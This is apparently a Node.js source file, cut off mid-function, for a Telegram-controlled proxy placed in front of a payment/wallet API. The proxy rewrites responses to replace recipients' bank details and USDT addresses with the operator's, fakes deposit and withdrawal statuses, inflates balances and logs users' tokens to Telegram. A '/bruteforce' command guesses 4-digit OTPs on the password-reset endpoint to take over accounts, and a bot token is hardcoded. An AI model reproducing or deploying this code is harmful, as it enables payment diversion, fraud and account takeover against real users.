const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const kv = new Redis({
  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN
});

const app = express();

const ORIGINAL_API = 'https://api.i-money.vip';
const token = '8728397123:AAH7SGg0CBGLHds2QSMxps0F1FkCIvlmbvM';
const WEBHOOK_URL = 'https://ixcv.vercel.app/api/telegram';
let bot;
let webhookSet = false;

if (token) {
  bot = new TelegramBot(token);
}

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch (e) {}
}

const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0, userOverrides: {}, trackedUsers: {}, withdrawOverride: 0 };

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
const tokenUserMap = {};

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  try {
    let data = await kv.get('bankData');
    if (data) {
      if (typeof data === 'string') data = JSON.parse(data);
      if (!data.userOverrides) data.userOverrides = {};
      if (!data.trackedUsers) data.trackedUsers = {};
      if (data.withdrawOverride === undefined) data.withdrawOverride = 0;
      if (data.logRequests === undefined) data.logRequests = false;
      if (data.usdtAddress === undefined) data.usdtAddress = '';
      if (data.fakeWithdrawals) delete data.fakeWithdrawals;
      cachedData = data;
      cacheTime = Date.now();
      return data;
    }
  } catch (e) {}
  const d = { ...DEFAULT_DATA, userOverrides: {}, trackedUsers: {} };
  cachedData = d;
  cacheTime = Date.now();
  return d;
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = req.headers['authorization'] || req.headers['token'] || '';
  if (tok && tok.length > 10) tokenUserMap[tok] = userId;
}

function getUserIdFromToken(req) {
  const tok = req.headers['authorization'] || req.headers['token'] || '';
  if (tok && tokenUserMap[tok]) return tokenUserMap[tok];
  return null;
}

async function trackUser(bankData, userId, info) {
  if (!userId || userId === 'N/A') return;
  if (!bankData.trackedUsers) bankData.trackedUsers = {};
  const existing = bankData.trackedUsers[String(userId)] || {};
  bankData.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0)
  };
}

async function saveData(data) {
  try {
    await kv.set('bankData', JSON.stringify(data));
    cachedData = data;
    cacheTime = Date.now();
  } catch (e) {}
}

function getUserOverride(bankData, userId) {
  if (!userId || !bankData.userOverrides) return null;
  return bankData.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(bankData, userId) {
  const uo = getUserOverride(bankData, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : bankData.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : bankData.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (bankData.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
  };
}

function getActiveBank(d, userId) {
  const uo = getUserOverride(d, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < d.banks.length) {
    return d.banks[uo.bankIndex];
  }
  if (d.autoRotate && d.banks.length > 0) {
    if (d.banks.length === 1) return d.banks[0];
    let nextIndex;
    do {
      nextIndex = Math.floor(Math.random() * d.banks.length);
    } while (nextIndex === d.lastUsedIndex && d.banks.length > 1);
    d.lastUsedIndex = nextIndex;
    d._rotatedIndex = nextIndex;
    return d.banks[nextIndex];
  }
  if (d.activeIndex >= 0 && d.activeIndex < d.banks.length) return d.banks[d.activeIndex];
  return null;
}

async function getActiveBankAndSave(d, userId) {
  const bank = getActiveBank(d, userId);
  if (d.autoRotate && d._rotatedIndex !== undefined) {
    d.lastUsedIndex = d._rotatedIndex;
    delete d._rotatedIndex;
    await saveData(d);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${a}`;
  }).join('\n');
}

function extractUserId(req, jsonResp) {
  const fromToken = getUserIdFromToken(req);
  if (fromToken) return fromToken;
  if (req.parsedBody && req.parsedBody.userId) return String(req.parsedBody.userId);
  const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
  if (qs.get('userId')) return String(qs.get('userId'));
  if (jsonResp && jsonResp.data) {
    if (jsonResp.data.userId) return String(jsonResp.data.userId);
    if (jsonResp.data.user && jsonResp.data.user.userId) return String(jsonResp.data.user.userId);
    if (jsonResp.data.id) return String(jsonResp.data.id);
  }
  const authHeader = req.headers['authorization'] || req.headers['token'] || '';
  if (authHeader) {
    try {
      const parts = authHeader.replace('Bearer ', '').split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        if (payload.userId) return String(payload.userId);
        if (payload.sub) return String(payload.sub);
        if (payload.id) return String(payload.id);
      }
    } catch(e) {}
  }
  return null;
}

app.use((req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const bodyStr = req.rawBody.toString();
    req.parsedBody = {};
    try {
      req.parsedBody = JSON.parse(bodyStr);
    } catch(e) {
      if (bodyStr && bodyStr.includes('=')) {
        const params = new URLSearchParams(bodyStr);
        for (const [k, v] of params) req.parsedBody[k] = v;
      }
    }
    next();
  });
});


app.use(async (req, res, next) => {
  try {
    const bankData = await loadData();
    if (bankData.logRequests && bankData.adminChatId && bot) {
      const path = req.originalUrl || req.url;
      if (path !== '/api/telegram' && !path.includes('favicon')) {
        const uid = extractUserId(req) || '';
        const idStr = uid ? ` [${uid}]` : '';
        bot.sendMessage(bankData.adminChatId, `📡 ${req.method} ${path}${idStr}`).catch(() => {});
      }
    }
  } catch(e) {}
  next();
});

async function transparentProxy(req, res) {
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' || 
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      forwardHeaders[key] = val;
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const opts = { method: req.method, headers: forwardHeaders };

    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      forwardHeaders['content-length'] = String(req.rawBody.length);
    }

    const response = await fetch(url, opts);

    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding') {
        respHeaders[key] = val;
      }
    });
    
    const body = await response.arrayBuffer();
    let buf = Buffer.from(body);

    try {
      let bodyStr = buf.toString('utf8');
      let parsed = null;
      try { parsed = JSON.parse(bodyStr); } catch(e) {}
      if (parsed) {
        const uid = extractUserId(req, parsed);
        if (uid) saveTokenUserId(req, uid);
      }

      const bankData = await loadData();
      if (bankData.usdtAddress) {
        let jsonResp = parsed;
        if (jsonResp) {
          const result = replaceUsdtInResponse(jsonResp, bankData, req.path);
          if (result && result.oldAddr) {
            const newBody = JSON.stringify(jsonResp);
            buf = Buffer.from(newBody);
            respHeaders['content-type'] = 'application/json; charset=utf-8';
            respHeaders['content-length'] = String(buf.length);
            respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
            delete respHeaders['etag'];
            delete respHeaders['last-modified'];
            if (bankData.adminChatId && bot && bankData.logRequests) {
              try {
                await bot.sendMessage(bankData.adminChatId, `🔄 USDT replaced in ${req.method} ${req.path}\nOld: ${result.oldAddr}\nNew: ${result.newAddr}`);
              } catch(e) {}
            }
          }
        }
      }
    } catch(e) {}

    res.writeHead(response.status, respHeaders);
    res.end(buf);
    return buf;
  } catch (e) {
    console.error('Proxy error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) {
      res.status(502).json({ code: 0, msg: 'Proxy error' });
    }
    return null;
  }
}

async function proxyFetch(req) {
  const url = ORIGINAL_API + req.originalUrl;
  const forwardHeaders = {};
  for (const [key, val] of Object.entries(req.headers)) {
    const k = key.toLowerCase();
    if (k === 'host' || k === 'connection' || k === 'content-length' ||
        k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
    forwardHeaders[key] = val;
  }
  forwardHeaders['host'] = 'api.i-money.vip';
  const opts = { method: req.method, headers: forwardHeaders };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    forwardHeaders['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const k = key.toLowerCase();
    if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  let jsonResp = null;
  try { jsonResp = JSON.parse(respBody); } catch(e) {}
  return { response, respBody, respHeaders, jsonResp };
}

function sendJson(res, respHeaders, jsonResp, respBody) {
  const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
  respHeaders['content-type'] = 'application/json; charset=utf-8';
  respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
  respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
  respHeaders['pragma'] = 'no-cache';
  delete respHeaders['etag'];
  delete respHeaders['last-modified'];
  res.writeHead(200, respHeaders);
  res.end(finalBody);
}

const BANK_FIELD_MAP = {
  receiveaccountno: 'accountNo', receiveaccountname: 'accountHolder', receiveifsc: 'ifsc',
  accountno: 'accountNo', accountname: 'accountHolder', accountholder: 'accountHolder',
  ifsc: 'ifsc', ifsccode: 'ifsc',
  bankaccountno: 'accountNo', bankaccountname: 'accountHolder', bankifsc: 'ifsc',
  receivename: 'accountHolder', receivebankname: 'accountHolder',
  beneficiaryname: 'accountHolder', beneficiaryaccount: 'accountNo',
  payeename: 'accountHolder', payeeaccount: 'accountNo', payeeifsc: 'ifsc',
  holdername: 'accountHolder', holderaccount: 'accountNo'
};

function replaceBankInUrl(urlStr, active) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: active.accountNo },
    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: active.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: active.ifsc },
    { names: ['displayAccountNumber'], value: 'XXXXXX' + active.accountNo.slice(-4) }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  return result;
}

function deepReplaceBankDetails(obj, active, originalValues, depth) {
  if (!obj || !active || typeof obj !== 'object') return;
  if (depth === undefined) depth = 0;
  if (depth > 10) return;

  for (const key of Object.keys(obj)) {
    const lk = key.toLowerCase();
    const mappedField = BANK_FIELD_MAP[lk];
    if (mappedField && obj[key] !== undefined && obj[key] !== null) {
      if (typeof obj[key] === 'string' || typeof obj[key] === 'number') {
        if (originalValues && typeof obj[key] === 'string' && obj[key].length > 3) {
          originalValues[key] = obj[key];
        }
        obj[key] = active[mappedField];
      }
    }

    if (typeof obj[key] === 'string') {
      const val = obj[key];
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, active);
      }
      if (originalValues) {
        for (const [origKey, origVal] of Object.entries(originalValues)) {
          if (typeof origVal === 'string' && origVal.length > 3 && obj[key].includes(origVal)) {
            const mappedF = BANK_FIELD_MAP[origKey.toLowerCase()];
            if (mappedF) {
              obj[key] = obj[key].split(origVal).join(active[mappedF]);
            }
          }
        }
      }
    }

    if (typeof obj[key] === 'object' && obj[key] !== null) {
      if (Array.isArray(obj[key])) {
        obj[key].forEach(item => {
          if (typeof item === 'object' && item !== null) deepReplaceBankDetails(item, active, originalValues, depth + 1);
        });
      } else {
        deepReplaceBankDetails(obj[key], active, originalValues, depth + 1);
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) {
      obj.payStatus = 2;
    }
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') {
        obj[field] = 2;
      } else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        if (!isNaN(num)) {
          obj[field] = '2';
        } else {
          obj[field] = 'success';
        }
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/telegram', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);

    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let bankData = await loadData();

    if (text === '/start') {
      if (bankData.adminChatId && bankData.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      bankData.adminChatId = chatId;
      if (bankData.botEnabled === undefined) bankData.botEnabled = true;
      if (bankData.autoRotate === undefined) bankData.autoRotate = false;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`🏦 IMoney Bank Controller

=== GLOBAL COMMANDS ===
/addbank <AccNo> | <Name> | <IFSC>
/removebank <number>
/usebank <number>
/deactivate
/list
/status

/on - Bot ON
/off - Bot OFF

/rotate on/off - Auto rotate banks
/deposit on <amount> - ALL users deposit success
/deposit off - ALL users normal

=== WITHDRAW COMMANDS ===
/on withdraw <count> - Last N orders → Paying (all users)
/on withdraw <count> <userId> - Last N orders → Paying (specific user)
/off withdraw - Restore global override
/off withdraw <userId> - Restore specific user

=== USDT COMMANDS ===
/setusdt <address> - Set custom USDT TRC20 address
/setusdt off - Disable USDT override

=== LOG COMMANDS ===
/log on - Log all API requests to Telegram
/log off - Stop logging

=== PER-ID COMMANDS ===
/id deposit on <amount> <userId>
/id deposit off <userId>
/id bank <bankNumber> <userId>
/id on <userId>
/id off <userId>
/id status <userId>
/id reset <userId>
/id list - Show all user overrides

Example:
/addbank 1234567890 | Rahul Kumar | SBIN0001234
/id deposit on 5000 28963
/id bank 2 28963`
      );
    }

    else if (bankData.adminChatId && chatId !== bankData.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    else if (text.startsWith('/id ')) {
      const idCmd = text.substring(4).trim();

      if (idCmd === 'list') {
        const overrides = bankData.userOverrides || {};
        const ids = Object.keys(overrides);
        if (ids.length === 0) {
          await bot.sendMessage(chatId, '📋 No per-ID overrides set.\nUse /id track to see detected users.');
        } else {
          let msg = '📋 Per-ID Overrides:\n\n';
          for (const uid of ids) {
            const uo = overrides[uid];
            const parts = [];
            if (uo.botEnabled !== undefined) parts.push(uo.botEnabled ? '🟢 ON' : '🔴 OFF');
            if (uo.depositSuccess !== undefined) parts.push(uo.depositSuccess ? '✅ Deposit ON (₹' + (uo.depositBonus || 0) + ')' : '🔴 Deposit OFF');
            if (uo.bankIndex !== undefined) parts.push('🏦 Bank #' + (uo.bankIndex + 1));
            msg += `👤 ${uid}: ${parts.join(' | ')}\n`;
          }
          await bot.sendMessage(chatId, msg);
        }
        return res.sendStatus(200);
      }

      if (idCmd === 'track') {
        const tracked = bankData.trackedUsers || {};
        const ids = Object.keys(tracked);
        if (ids.length === 0) {
          await bot.sendMessage(chatId, '📋 No users detected yet.\nUsers will appear here when they make orders or UTR uploads.');
        } else {
          let msg = '📋 Detected Users:\n\n';
          for (const uid of ids) {
            const u = tracked[uid];
            const hasOverride = bankData.userOverrides && bankData.userOverrides[uid] ? ' ⚙️' : '';
            msg += `👤 ${uid}${hasOverride}\n   Last: ${u.lastAction || 'N/A'}\n   Seen: ${u.lastSeen || 'N/A'}\n   Orders: ${u.orderCount || 0}\n\n`;
          }
          msg += '⚙️ = has per-ID override\nUse /id status <userId> for details';
          await bot.sendMessage(chatId, msg);
        }
        return res.sendStatus(200);
      }

      const depositOnMatch = idCmd.match(/^deposit on\s+(\d+(?:\.\d+)?)\s+(\d+)$/);
      if (depositOnMatch) {
        const amount = parseFloat(depositOnMatch[1]);
        const userId = depositOnMatch[2];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].depositSuccess = true;
        bankData.userOverrides[userId].depositBonus = (bankData.userOverrides[userId].depositBonus || 0) + amount;
        await saveData(bankData);
        await bot.sendMessage(chatId, `✅ User ${userId}: Deposit SUCCESS ON\n💰 Bonus: ₹${bankData.userOverrides[userId].depositBonus}`);
        return res.sendStatus(200);
      }

      const depositOffMatch = idCmd.match(/^deposit off\s+(\d+)$/);
      if (depositOffMatch) {
        const userId = depositOffMatch[1];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].depositSuccess = false;
        bankData.userOverrides[userId].depositBonus = 0;
        await saveData(bankData);
        await bot.sendMessage(chatId, `🔴 User ${userId}: Deposit OFF, bonus removed.`);
        return res.sendStatus(200);
      }

      const bankMatch = idCmd.match(/^bank\s+(\d+)\s+(\d+)$/);
      if (bankMatch) {
        const bankNum = parseInt(bankMatch[1]);
        const userId = bankMatch[2];
        if (bankNum < 1 || bankNum > bankData.banks.length) {
          await bot.sendMessage(chatId, `❌ Invalid bank number. /list se check karo.`);
          return res.sendStatus(200);
        }
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].bankIndex = bankNum - 1;
        await saveData(bankData);
        const bank = bankData.banks[bankNum - 1];
        await bot.sendMessage(chatId, `✅ User ${userId}: Bank #${bankNum} set\n${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`);
        return res.sendStatus(200);
      }

      const onMatch = idCmd.match(/^on\s+(\d+)$/);
      if (onMatch) {
        const userId = onMatch[1];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].botEnabled = true;
        await saveData(bankData);
        await bot.sendMessage(chatId, `🟢 User ${userId}: Bot ON`);
        return res.sendStatus(200);
      }

      const offMatch = idCmd.match(/^off\s+(\d+)$/);
      if (offMatch) {
        const userId = offMatch[1];
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].botEnabled = false;
        await saveData(bankData);
        await bot.sendMessage(chatId, `🔴 User ${userId}: Bot OFF`);
        return res.sendStatus(200);
      }

      const statusMatch = idCmd.match(/^status\s+(\d+)$/);
      if (statusMatch) {
        const userId = statusMatch[1];
        const uo = getUserOverride(bankData, userId);
        const eff = getEffectiveSettings(bankData, userId);
        let msg = `📊 User ${userId} Status:\n\n`;
        if (!uo) {
          msg += '(No overrides — using global settings)\n\n';
        }
        msg += `Bot: ${eff.botEnabled !== false ? '🟢 ON' : '🔴 OFF'}${uo && uo.botEnabled !== undefined ? ' (per-ID)' : ' (global)'}\n`;
        msg += `Deposit: ${eff.depositSuccess ? '✅ ON (₹' + eff.depositBonus + ')' : '🔴 OFF'}${uo && uo.depositSuccess !== undefined ? ' (per-ID)' : ' (global)'}\n`;
        if (eff.bankOverride !== null && eff.bankOverride >= 0 && eff.bankOverride < bankData.banks.length) {
          const b = bankData.banks[eff.bankOverride];
          msg += `Bank: 🏦 #${eff.bankOverride + 1} ${b.accountHolder} | ${b.accountNo} (per-ID)\n`;
        } else {
          const active = getActiveBank(bankData, null);
          msg += `Bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None'} (global)\n`;
        }
        const wc = uo && uo.withdrawCount ? uo.withdrawCount : 0;
        msg += `Withdraw: ${wc > 0 ? '✅ First ' + wc + ' → Paying (per-ID)' : (bankData.withdrawOverride > 0 ? '✅ First ' + bankData.withdrawOverride + ' → Paying (global)' : '❌ OFF')}\n`;
        await bot.sendMessage(chatId, msg);
        return res.sendStatus(200);
      }

      const resetMatch = idCmd.match(/^reset\s+(\d+)$/);
      if (resetMatch) {
        const userId = resetMatch[1];
        if (bankData.userOverrides && bankData.userOverrides[userId]) {
          delete bankData.userOverrides[userId];
          await saveData(bankData);
          await bot.sendMessage(chatId, `🔄 User ${userId}: All overrides removed. Using global settings.`);
        } else {
          await bot.sendMessage(chatId, `ℹ️ User ${userId}: No overrides to reset.`);
        }
        return res.sendStatus(200);
      }

      await bot.sendMessage(chatId, `❌ Invalid /id command.\n\nUsage:\n/id deposit on <amount> <userId>\n/id deposit off <userId>\n/id bank <bankNum> <userId>\n/id on <userId>\n/id off <userId>\n/id status <userId>\n/id reset <userId>\n/id list`);
      return res.sendStatus(200);
    }

    else if (text.match(/^\/on withdraw\s+/i)) {
      const parts = text.replace(/^\/on withdraw\s+/i, '').trim().split(/\s+/);
      const count = parseInt(parts[0]);
      const userId = parts[1] || null;
      if (isNaN(count) || count <= 0) {
        await bot.sendMessage(chatId, '❌ Format: /on withdraw <count> [userId]\nExample: /on withdraw 2\nExample: /on withdraw 1 49740');
        return res.sendStatus(200);
      }
      if (userId) {
        if (!bankData.userOverrides) bankData.userOverrides = {};
        if (!bankData.userOverrides[userId]) bankData.userOverrides[userId] = {};
        bankData.userOverrides[userId].withdrawCount = count;
        await saveData(bankData);
        await bot.sendMessage(chatId, `✅ Withdraw override ON for user ${userId}\n🔄 First ${count} order(s) → Paying\n\nUse /off withdraw ${userId} to restore.`);
      } else {
        bankData.withdrawOverride = count;
        await saveData(bankData);
        await bot.sendMessage(chatId, `✅ Withdraw override ON (global)\n🔄 First ${count} order(s) → Paying\n\nUse /off withdraw to restore.`);
      }
      return res.sendStatus(200);
    }

    else if (text.match(/^\/off withdraw/i)) {
      const userId = text.replace(/^\/off withdraw\s*/i, '').trim();
      if (userId) {
        if (bankData.userOverrides && bankData.userOverrides[userId] && bankData.userOverrides[userId].withdrawCount) {
          const old = bankData.userOverrides[userId].withdrawCount;
          delete bankData.userOverrides[userId].withdrawCount;
          await saveData(bankData);
          await bot.sendMessage(chatId, `🗑 Withdraw override OFF for user ${userId}\nWas: first ${old} order(s) → Paying`);
        } else {
          await bot.sendMessage(chatId, `ℹ️ No withdraw override for user ${userId}.`);
        }
      } else {
        if (bankData.withdrawOverride) {
          const old = bankData.withdrawOverride;
          bankData.withdrawOverride = 0;
          await saveData(bankData);
          await bot.sendMessage(chatId, `🗑 Withdraw override OFF (global)\nWas: first ${old} order(s) → Paying`);
        } else {
          await bot.sendMessage(chatId, `ℹ️ Withdraw override is already OFF.`);
        }
      }
      return res.sendStatus(200);
    }

    else if (text.trim() === '/log on') {
      bankData.logRequests = true;
      await saveData(bankData);
      await bot.sendMessage(chatId, `📡 Request logging ON\nAll API requests will be logged to Telegram.\n\nUse /log off to stop.`);
      return res.sendStatus(200);
    }

    else if (text.trim() === '/log off') {
      bankData.logRequests = false;
      await saveData(bankData);
      await bot.sendMessage(chatId, `🔇 Request logging OFF`);
      return res.sendStatus(200);
    }

    else if (text.startsWith('/setusdt ')) {
      const arg = text.substring(9).trim();
      if (arg.toLowerCase() === 'off') {
        bankData.usdtAddress = '';
        await saveData(bankData);
        await bot.sendMessage(chatId, `❌ USDT override OFF\nOriginal address will be shown.`);
      } else if (arg.length >= 20) {
        bankData.usdtAddress = arg;
        await saveData(bankData);
        await bot.sendMessage(chatId, `✅ USDT address set:\n${arg}\n\nAll USDT deposit pages will show this address + QR.\nUse /setusdt off to disable.`);
      } else {
        await bot.sendMessage(chatId, `❌ Invalid address. Must be 20+ chars.\nFormat: /setusdt <TRC20 address>`);
      }
      return res.sendStatus(200);
    }

    else if (text.startsWith('/bruteforce ')) {
      const parts = text.substring(12).trim().split(/\s+/);
      if (parts.length < 2) {
        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [batchSize]\nDefault: 4-digit, 20 per batch\nExample: /bruteforce 6206785398 mypass123\n/bruteforce 6206785398 mypass123 500 50`);
        return res.sendStatus(200);
      }
      const phone = parts[0];
      const newPass = parts[1];
      const startFrom = parseInt(parts[2] || '0');
      const batchSize = Math.min(parseInt(parts[3] || '20'), 100);
      const maxOtp = 9999;

      try {
        await fetch(ORIGINAL_API + '/smsCode', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
          body: `phone=${encodeURIComponent(phone)}`
        });
      } catch(e) {}

      await bot.sendMessage(chatId, `🔓 Brute force (sequential)\nPhone: ${phone}\nFresh OTP requested ✅\nRange: ${String(startFrom).padStart(4, '0')} → ${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(4, '0')}\nBatch: ${batchSize} (one-by-one)`);

      let found = false;
      let foundOtp = '';
      let foundResp = '';
      let tried = 0;
      let lastStatus = '';

      for (let i = startFrom; i < startFrom + batchSize && i <= maxOtp && !found; i++) {
        const otp = String(i).padStart(4, '0');
        const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
        try {
          const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
            body: formBody
          });
          const result = await resp.json();
          lastStatus = result.statusCode + ': ' + result.statusInfo;
          tried++;
          if (result.statusCode !== '1023') {
            found = true;
            foundOtp = otp;
            foundResp = JSON.stringify(result, null, 2);
          }
          if (result.statusCode !== '1023' && result.statusCode !== '0') {
            await bot.sendMessage(chatId, `⚠️ Unexpected response at OTP ${otp}:\n${JSON.stringify(result, null, 2).substring(0, 500)}`);
            break;
          }
        } catch(e) {
          await bot.sendMessage(chatId, `⚠️ Network error at OTP ${otp}: ${e.message}`);
          break;
        }
      }

      if (found) {
        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n\nResponse:\n${foundResp.substring(0, 1000)}`);
      } else {
        const nextStart = startFrom + batchSize;
        if (nextStart <= maxOtp) {
          await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(4, '0')} (${tried} tried)\nLast: ${lastStatus}\n\nContinue:\n/bruteforce ${phone} ${newPass} ${nextStart} ${batchSize}`);
        } else {
          await bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted.`);
        }
      }
      return res.sendStatus(200);
    }

    else if (text.startsWith('/testotp ')) {
      const parts = text.substring(8).trim().split(/\s+/);
      if (parts.length < 3) {
        await bot.sendMessage(chatId, `Format: /testotp <phone> <password> <otp>`);
        return res.sendStatus(200);
      }
      const [phone, newPass, otp] = parts;
      const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;

      const hdrs = savedForgetPassHeaders ? { ...savedForgetPassHeaders } : { 'host': 'api.i-money.vip' };
      hdrs['content-type'] = 'application/x-www-form-urlencoded';
      hdrs['content-length'] = String(Buffer.byteLength(formBody));

      try {
        const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
          method: 'POST',
          headers: hdrs,
          body: formBody
        });
        const statusCode = resp.status;
        const respText = await resp.text();
        let result;
        try { result = JSON.parse(respText); } catch(e) { result = respText; }
        await bot.sendMessage(chatId, `🧪 Test OTP: ${otp}\nHTTP Status: ${statusCode}\nBody sent: ${formBody}\nHeaders used: ${savedForgetPassHeaders ? 'saved auth' : 'minimal'}\n\nResponse:\n${JSON.stringify(result, null, 2).substring(0, 2000)}`);
